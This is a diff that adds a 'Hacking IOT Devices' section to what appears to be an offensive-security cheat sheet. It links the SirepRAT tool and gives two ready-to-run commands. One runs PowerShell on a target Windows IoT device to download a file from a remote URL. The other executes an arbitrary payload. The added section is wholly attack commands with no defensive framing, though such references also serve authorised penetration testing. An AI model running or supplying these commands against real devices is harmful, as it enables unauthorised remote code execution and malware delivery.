@@ -668,3 +668,12 @@ CLSID is based on operating system, see above links for more information about l
 
 ### lolbins
 https://lolbas-project.github.io/lolbas/Binaries/Certreq/
+
+### Hacking IOT Devices
+https://github.com/SafeBreach-Labs/SirepRAT
+
+```
+python SirepRAT.py <IP> LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -OutFile <OUTDIR> -Uri <URL>" --v
+
+python SirepRAT.py <IP> LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c <PAYLOAD>" --v
+```
